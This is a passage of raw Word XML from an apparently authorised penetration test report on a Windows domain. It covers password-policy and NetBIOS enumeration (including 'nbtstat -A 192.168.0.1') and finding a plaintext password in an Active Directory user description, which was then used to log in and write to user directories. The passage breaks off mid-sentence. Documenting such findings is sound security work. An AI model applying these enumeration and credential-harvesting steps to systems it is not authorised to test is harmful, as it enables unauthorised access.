                              <w:t>18 Polenum was used to enumerate the password policy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563194" id="_x0000_s1043" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:179.35pt;width:312.75pt;height:20.65pt;z-index:2517094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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3DDB2E8D" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>18 Polenum was used to enumerate the password policy</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00DC441B">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251707392" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="70775866" wp14:editId="2D8746CE">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>482</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2244436" cy="2206005"/>
            <wp:effectExtent l="0" t="0" r="3810" b="381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18653" t="22470" r="44455" b="13065"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2244436" cy="2206005"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FAB133" w14:textId="77777777" w:rsidR="00A661DD" w:rsidRPr="006F798B" w:rsidRDefault="00A661DD" w:rsidP="006F798B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A6CB21D" w14:textId="77777777" w:rsidR="00A661DD" w:rsidRPr="008A7860" w:rsidRDefault="004B7E63" w:rsidP="00A661DD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251711488" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="39B40927" wp14:editId="4ACFFF79">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3099663</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2186940" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="3810" b="4445"/>
                <wp:wrapTopAndBottom/>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6940" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="371AF473" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>19 netbios enumeration with Nbtstat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B40927" id="_x0000_s1044" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:244.05pt;width:172.2pt;height:20.65pt;z-index:2517114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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="371AF473" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>19 netbios enumeration with Nbtstat</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00A661DD">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Nbtstat was </w:t>
      </w:r>
      <w:r w:rsidR="006F798B">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">used </w:t>
      </w:r>
      <w:r w:rsidR="008A7860">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">to get a quick view of the netbios. This was completed through </w:t>
      </w:r>
      <w:r w:rsidR="008A7860">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>nbtstat -A 192.168.0.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>, see fig 19</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F9F267" w14:textId="77777777" w:rsidR="006F798B" w:rsidRPr="006F798B" w:rsidRDefault="004B7E63" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251712512" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2888AAC9" wp14:editId="1E0CB517">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>163830</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4768850" cy="2469515"/>
            <wp:effectExtent l="0" t="0" r="0" b="698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6008" t="13666" r="53586" b="49024"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4768850" cy="2469515"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD53A86" w14:textId="77777777" w:rsidR="006F798B" w:rsidRPr="00A661DD" w:rsidRDefault="006F798B" w:rsidP="00A661DD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007077E7">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Nbtenum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> enumerated the </w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>NetBIOS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. Results can be seen in </w:t>
      </w:r>
      <w:r w:rsidR="007077E7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>appendi</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidR="007077E7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7833101A" w14:textId="77777777" w:rsidR="00261D49" w:rsidRDefault="00261D49" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc27518406"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Hacking Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FDA52A" w14:textId="77777777" w:rsidR="00E41584" w:rsidRDefault="005860BE" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>AD explorer was used to traverse the active directory and see if there was a plaintext password contained within any of the users or groups present.</w:t>
      </w:r>
      <w:r w:rsidR="00E15F8D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">By searching for a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">description </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>contains “pass”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a user was indeed found to have an unhashed password stored under description.</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:t xml:space="preserve"> See fig 20.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B60F80" w14:textId="77777777" w:rsidR="00E41584" w:rsidRDefault="004B7E63" w:rsidP="00E15F8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251714560" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="688C058D" wp14:editId="5EBDD607">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>1228725</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2604871</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2713355" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="0" b="4445"/>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3355" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="20950A0F" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>20 ad explorer discover an unhashed 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8C058D" id="_x0000_s1045" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:96.75pt;margin-top:205.1pt;width:213.65pt;height:20.65pt;z-index:251714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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="20950A0F" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>20 ad explorer discover an unhashed password</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251715584" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="33C8A249" wp14:editId="330698E5">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>260045</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>174625</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4769485" cy="2242185"/>
            <wp:effectExtent l="0" t="0" r="0" b="571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42452" t="22197" b="29706"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4769485" cy="2242185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7D9A22" w14:textId="77777777" w:rsidR="00E41584" w:rsidRDefault="00E41584" w:rsidP="00E15F8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="668EF546" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="004B7E63" w:rsidP="00E15F8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251717632" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1F2462E2" wp14:editId="51F23BD6">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2078914</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1901825" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="3175" b="4445"/>
                <wp:wrapTopAndBottom/>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1825" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="3C610937" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>21 logging into the user account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2462E2" id="_x0000_s1046" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:163.7pt;width:149.75pt;height:20.65pt;z-index:2517176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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3C610937" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>21 logging into the user account</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00E41584">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251669504" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="54EE625F" wp14:editId="5840CA5A">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>254746</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="1836420" cy="177292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21918" t="33078" r="59190" b="34493"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1836751" cy="1773461"/>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15F8D">
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="00E41584">
        <w:t xml:space="preserve">immediately allowed access to this users account </w:t>
      </w:r>
      <w:r>
        <w:t>(fig 21)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15645FFD" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="00E15F8D" w:rsidP="00E41584">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="708" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46C3336B" w14:textId="77777777" w:rsidR="00E41584" w:rsidRDefault="004B7E63" w:rsidP="00E41584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251719680" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="489FB17E" wp14:editId="3168FD99">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2105406</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2150110" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="2540" b="4445"/>
                <wp:wrapTopAndBottom/>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0110" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5773662F" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">22 Leaving a file in the </w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>users</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> directory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9FB17E" id="_x0000_s1047" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:165.8pt;width:169.3pt;height:20.65pt;z-index:2517196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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5773662F" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">22 Leaving a file in the </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>users</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> directory</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251670528" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="23D5B3B8" wp14:editId="585C6B37">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>592709</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2543810" cy="1391285"/>
            <wp:effectExtent l="0" t="0" r="889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13182" t="45887" r="59924" b="27970"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2543810" cy="1391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E41584">
        <w:t>It also allowed the pen</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">etration </w:t>
      </w:r>
      <w:r w:rsidR="00E41584">
        <w:t>tester to save a file in the users library, which in turn meant the pen</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">etration </w:t>
      </w:r>
      <w:r w:rsidR="00E41584">
        <w:t xml:space="preserve">tester also has access to all the users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E41584">
        <w:t>directories.</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>fig 22)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499866CA" w14:textId="77777777" w:rsidR="00E41584" w:rsidRDefault="00E41584" w:rsidP="00E41584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76AC21D4" w14:textId="0039366E" w:rsidR="00E15F8D" w:rsidRDefault="00E41584" w:rsidP="00E41584">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Exploring this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>user</w:t>
      </w:r>
